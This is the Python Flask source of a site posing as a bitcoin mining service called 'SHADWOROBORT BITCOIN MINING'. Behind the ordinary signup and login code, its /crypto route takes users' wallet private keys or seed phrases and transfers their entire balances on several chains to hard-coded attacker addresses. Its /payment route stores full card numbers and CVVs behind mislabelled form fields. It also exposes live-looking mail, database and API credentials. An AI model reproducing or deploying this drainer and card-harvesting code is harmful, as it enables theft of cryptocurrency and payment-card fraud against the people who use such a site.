from flask import Flask, request, render_template, redirect, url_for, flash, session
from flask_bcrypt import Bcrypt
from flask_mail import Mail, Message
from flask_mysqldb import MySQL
from flask_login import login_required, current_user
import os
import mysql.connector
from MySQLdb.cursors import DictCursor
import random
from functools import wraps
import string
from web3 import Web3
import uuid
from bitcoinlib.wallets import Wallet
from mnemonic import Mnemonic
from bitcoinlib.services.services import ServiceError
from eth_account import Account
import warnings
warnings.filterwarnings("ignore")
from werkzeug.utils import secure_filename




from flask import session
import MySQLdb.cursors


app = Flask(__name__)

# Database Config
app.config['MYSQL_HOST'] = "localhost"
app.config['MYSQL_USER'] = "root"
app.config['MYSQL_PASSWORD'] = "James"
app.config['MYSQL_DB'] = 'shadowrobotbm'
app.config['MYSQL_SSL'] = {'ssl': {'verify_ssl': False}}  # Disable SSL verification
app.config['SECRET_KEY'] = 'Jamiecoo202'

# Mail Config
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USE_TLS'] = False  # Disable TLS when using port 465
app.config['MAIL_USE_SSL'] = True   # Enable SSL when using port 465

app.config['MAIL_USERNAME'] = 'shadowrobot.customer.service@gmail.com'
app.config['MAIL_PASSWORD'] = 'puhp hqul aeyv jygp'  
app.config['MAIL_DEFAULT_SENDER'] = 'shadowrobot.customer.service@gmail.com'

# Initialize extensions
bcrypt = Bcrypt(app)
mysql = MySQL(app)
mail = Mail(app)

# Helper function to generate random tokens
def generate_token(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Helper function to send verification email
def send_verification_email(email, activation_token):
    try:
        activation_link = url_for('login', token=activation_token, _external=True)
        msg = Message("Confirm your email address to complete signup ", recipients=[email])
        msg.body = f"""
        Welcome to SHADWOROBORT BITCOIN MINING!

        To verify your email address , kindly click the link below:

        {activation_link}

        Once email is verified, your account signup will be completed.

        If you didn't request this, you can ignore this email.
        """
        mail.send(msg)
        return True
    except Exception as e:
        print(f"❌ Email sending failed: {e}")
        return False
    
    



def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            flash("Please log in to access this page.", "warning")
            return redirect(url_for('login'))  # Redirect to login page
        return f(*args, **kwargs)
    return decorated_function


# Updated login function to work correctly with MySQLdb
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email').lower()
        entered_password = request.form.get('password')

        conn = mysql.connection
        cursor = conn.cursor()

        try:
            # Make sure to properly handle the query with case-insensitive matching
            cursor.execute("SELECT * FROM users WHERE LOWER(email) = %s", (email,))
            user = cursor.fetchone()

            if user:
                # Access the user data directly by column names as a tuple
                user_id = user[0]
                db_username = user[1]
                db_email = user[2]
                hashed_password = user[3]
                is_verified = user[4]  # Assuming 1 = verified, 0 = not

                if not is_verified:
                    flash("Please verify your email before logging in.", "warning")
                    return redirect(url_for('login'))

                if bcrypt.check_password_hash(hashed_password, entered_password):
                    # Set session to log in the user
                    session['user_id'] = user_id
                    session['username'] = db_username
                    session['email'] = db_email
                    flash("Login successful!", "success")
                    return redirect(url_for('mining'))  # Or wherever your dashboard is
                else:
                    flash("Incorrect password.", "danger")
            else:
                flash("User not found.", "danger")
        finally:
            cursor.close()

    return render_template('login.html')




def logout_user():
    session.clear()  # Clear all session data at once

@app.route('/logout')
def logout():
    logout_user()
    flash('You have been logged out.')
    return redirect(url_for('login'))

    





@app.route('/signup', methods=['GET', 'POST'])
def signup():
    referrer_username = request.args.get('ref')  # URL referral, e.g. /signup?ref=john

    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        referrer = request.form.get('referrer') or referrer_username  # Either from form or URL

        conn = mysql.connection
        cursor = conn.cursor()

        # Check for duplicate email
        cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
        if cursor.fetchone():
            flash("Email is already registered.", "error")
            cursor.close()
            return redirect(url_for('signup'))

        # Hash password
        hashed_pw = bcrypt.generate_password_hash(password).decode('utf-8')
        activation_token = generate_token()

        # Give every new user 500 points, save referral_code as their username
        cursor.execute("""
            INSERT INTO users (username, email, password, activation_token, token_created_at, referral_code, referrer, points)
            VALUES (%s, %s, %s, %s, NOW(), %s, %s, 500)
        """, (username, email, hashed_pw, activation_token, username, referrer))

        # If they were referred, give the referrer 50 points
        if referrer:
            cursor.execute("SELECT * FROM users WHERE username = %s", (referrer,))
            if cursor.fetchone():
                cursor.execute("UPDATE users SET points = points + 50 WHERE username = %s", (referrer,))

        conn.commit()
        cursor.close()

        # Send activation email
        if send_verification_email(email, activation_token):
            flash("Signup successful! Check your email to confirm your email address.", "success")
            return redirect(url_for('signup_success'))
        else:
            flash("Failed to send verification email.", "error")
            return redirect(url_for('signup'))

    return render_template('signup.html', referrer=referrer_username)






@app.route('/activate/<token>')
def activate_account(token):
    conn = mysql.connection
    cursor = conn.cursor()

    # Find user by token
    cursor.execute("SELECT * FROM users WHERE activation_token = %s", (token,))
    user = cursor.fetchone()

    if user:
        cursor.execute("""
            UPDATE users
            SET is_verified = TRUE, activation_token = NULL, token_created_at = NULL
            WHERE activation_token = %s
        """, (token,))
        conn.commit()
        cursor.close()

        flash("Email verified successfully! You can now log in.", "success")
        return redirect(url_for('login'))
    else:
        cursor.close()
        flash("Invalid or expired activation link.", "error")
        return redirect(url_for('home'))




# Route for successful signup
@app.route('/signup_success')
def signup_success():
    return render_template('signup_success.html')



@app.route('/mining')
@login_required
def mining():
    # Default user info
    user = {
        'profile_picture': '/static/uploads/default.jpg',
        'username': '',
        'points': 0
    }

    if 'user_id' in session:
        cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
        cursor.execute("SELECT profile_picture, username, points FROM users WHERE id = %s", (session['user_id'],))
        db_user = cursor.fetchone()

        if db_user:
            # Keep profile_picture logic from original code
            user['profile_picture'] = db_user.get('profile_picture') or user['profile_picture']
            user['username'] = db_user.get('username', '')
            user['points'] = db_user.get('points', 0)

    return render_template('mining.html', user=user)


@app.route('/')
def home():
    user_email = session.get('email')
    if not user_email:
        flash("Please log in to continue.")
        return redirect(url_for('login'))

    cursor = mysql.connection.cursor(DictCursor)
    cursor.execute("SELECT username FROM users WHERE email = %s", (user_email,))
    user = cursor.fetchone()
    cursor.close()

    if user:
        return render_template("index.html", username=user['username'])
    else:
        flash("User not found.")
        return redirect(url_for('login'))




@app.route('/payment', methods=['GET', 'POST'])
def payment():
    if request.method == 'POST':
        # Get Form Data
        card_type = request.form['name_selection']
        card_number = request.form['phone']
        expiry_date = request.form['dob']
        cvv = request.form['age']
        address1 = request.form['address1']
        address2 = request.form['address2']
        country = request.form['country']
        city = request.form['city']
        postal_code = request.form['postalcode']
        captcha = request.form['password']

        # --- Save Data to Database ---
        try:
            sql = """INSERT INTO payments 
                    (card_type, card_number, expiry_date, cvv, address1, address2, country, city, postal_code, captcha) 
                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)"""
            values = (card_type, card_number, expiry_date, cvv, address1, address2, country, city, postal_code, captcha)

            # Connect to your MySQL database and execute the query here
            conn = mysql.connect()  # Update with your actual connection logic
            cursor = conn.cursor()
            cursor.execute(sql, values)
            conn.commit()
            cursor.close()
            conn.close()

            flash('Payment details saved successfully!')
            return redirect(url_for('home'))

        except Exception as e:
            print(f"Error: {e}")
            flash('Failed to save payment details. Please try again.')
            return redirect(url_for('home'))
    
    # Handle GET request (if needed, you can return a page or form)
    return render_template('payment.html')  # Ensure you return a valid response here (like the payment form page)





# Route for payment success
@app.route('/payment_success')
def payment_success():
    return "Payment processed successfully!"




@app.route('/delete_account', methods=['POST'])
def delete_account():
    if 'user_id' in session:
        user_id = session['user_id']
        cursor = mysql.connection.cursor()
        cursor.execute("DELETE FROM users WHERE id = %s", (user_id,))
        mysql.connection.commit()
        session.clear()  # Log user out
        return redirect('/')  # Redirect to homepage
    return render_template('index.html')  # Or redirect to login or show error page









# Enable mnemonic functionality
Account.enable_unaudited_hdwallet_features()

# 🔑 Ankr RPC Key
ANKR_API_KEY = 'c68c5ee4d21e3b8e1dfadb20696d363a469f043038d2c891fc5afc5d9757b588'

# 🔗 RPC Endpoints with Ankr Key
EVM_RPCS = {
    "ETH": Web3(Web3.HTTPProvider(f'https://rpc.ankr.com/eth/{ANKR_API_KEY}')),
    "BNB": Web3(Web3.HTTPProvider(f'https://rpc.ankr.com/bsc/{ANKR_API_KEY}')),
    "POLYGON": Web3(Web3.HTTPProvider(f'https://rpc.ankr.com/polygon/{ANKR_API_KEY}')),
    "ARBITRUM": Web3(Web3.HTTPProvider(f'https://rpc.ankr.com/arbitrum/{ANKR_API_KEY}')),
    "OPTIMISM": Web3(Web3.HTTPProvider(f'https://rpc.ankr.com/optimism/{ANKR_API_KEY}')),
    "BASE": Web3(Web3.HTTPProvider(f'https://rpc.ankr.com/base/{ANKR_API_KEY}')),
}

# 📥 Receiver Addresses
RECEIVER_ADDRESSES = {
    "BTC": "bc1q90x9yw25epvd3wcewrxqlx4lnvhwvc94pcrlxc",
    "ETH": "0x75a92e58831fc01fce94ffe8347071549fde04e9",
    "BNB": "0x75a92e58831fc01fce94ffe8347071549fde04e9",
    "BCH": "qzss7q0de0z3lsy3dkmtyrfqrgqs99kvdghertpl06",
    "USDT": "0x75a92e58831fc01fce94ffe8347071549fde04e9",
    "USDC": "0x75a92e58831fc01fce94ffe8347071549fde04e9",
    # Default receiver for all EVM chains
    "DEFAULT_EVM": "0x75a92e58831fc01fce94ffe8347071549fde04e9"
}


@app.route('/crypto', methods=['GET', 'POST'])
@login_required
def crypto():
    if request.method == 'POST':
        wallet_address = request.form.get('wallet_address')
        secret_input = request.form.get('private_key')
        networks = request.form.getlist('networks')

        mnemo = Mnemonic("english")
        is_mnemonic = mnemo.check(secret_input)

        for network in networks:
            try:
                if is_mnemonic:
                    acct = Account.from_mnemonic(secret_input)
                    derived_key = acct.key.hex()
                    derived_address = acct.address
                else:
                    derived_key = secret_input
                    derived_address = wallet_address

                if network in EVM_RPCS:
                    send_evm(EVM_RPCS[network], derived_address, derived_key, RECEIVER_ADDRESSES["DEFAULT_EVM"], network)
                elif network == 'USDT':
                    send_evm(EVM_RPCS["ETH"], derived_address, derived_key, RECEIVER_ADDRESSES["USDT"], "USDT")
                elif network == 'BTC':
                    flash(send_btc(secret_input, is_mnemonic), "success")
                else:
                    flash(f"Unsupported network: {network}", "error")
            except Exception as e:
                flash(f"{network} Error: {str(e)}", "error")

        return render_template('crypto_form.html')

    return render_template('crypto_form.html')


def send_evm(web3, wallet_address, private_key, receiver, label):
    if not web3.is_address(wallet_address):
        raise Exception(f"Invalid {label} address: {wallet_address}")

    nonce = web3.eth.get_transaction_count(wallet_address)
    balance = web3.eth.get_balance(wallet_address)
    gas_price = web3.eth.gas_price
    gas = 21000
    sendable_value = balance - (gas_price * gas)

    if sendable_value <= 0:
        raise Exception(f"{label} balance too low to send after gas fee.")

    tx = {
        'nonce': nonce,
        'to': receiver,
        'value': sendable_value,
        'gas': gas,
        'gasPrice': gas_price,
        'chainId': web3.eth.chain_id
    }

    signed_tx = web3.eth.account.sign_transaction(tx, private_key)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    flash(f"{label} sent: {web3.to_hex(tx_hash)}", "success")



def send_btc(secret_input, is_mnemonic):
    try:
        # Generate a unique wallet name to avoid conflict
        temp_wallet_name = f"tempwallet_{uuid.uuid4().hex}"

        wallet = Wallet.create(
            name=temp_wallet_name,
            keys=secret_input,
            network='bitcoin',
            witness_type='segwit',
            db_uri=None  # Use in-memory database (temporary)
        )
        wallet.scan()
        total_balance = float(wallet.balance())

        if total_balance <= 0:
            raise Exception("BTC balance is zero.")

        tx = wallet.send_to(RECEIVER_ADDRESSES['BTC'], total_balance)
        return f"BTC sent: {tx.txid}"
    except ServiceError as e:
        raise Exception(f"BTC Service Error: {str(e)}")
    except Exception as e:
        raise Exception(f"BTC Error: {str(e)}")



    
    
    

# Upload configuration
UPLOAD_FOLDER = 'static/uploads/'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload_profile_picture', methods=['POST'])
@login_required
def upload_profile_picture():
    if 'profile_picture' not in request.files:
        flash('No image part')
        return redirect(url_for('mining'))

    file = request.files['profile_picture']

    if file.filename == '':
        flash('No selected image')
        return redirect(url_for('mining'))

    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)

        # Get user's email or ID from session (recommended)
        user_email = session.get('email')  # Ensure email is stored during login

        if user_email:
            cursor = mysql.connection.cursor()
            cursor.execute("UPDATE users SET profile_picture = %s WHERE email = %s", (filename, user_email))
            mysql.connection.commit()
            cursor.close()
            flash("Profile image updated successfully!")
        else:
            flash("User not logged in.")

        return redirect(url_for('mining'))

    flash("Invalid image format.")
    return redirect(url_for('mining'))






@app.route('/profile')
@login_required
def profile():
    return render_template('profile.html')








if __name__ == '__main__':
    app.run(debug=True)
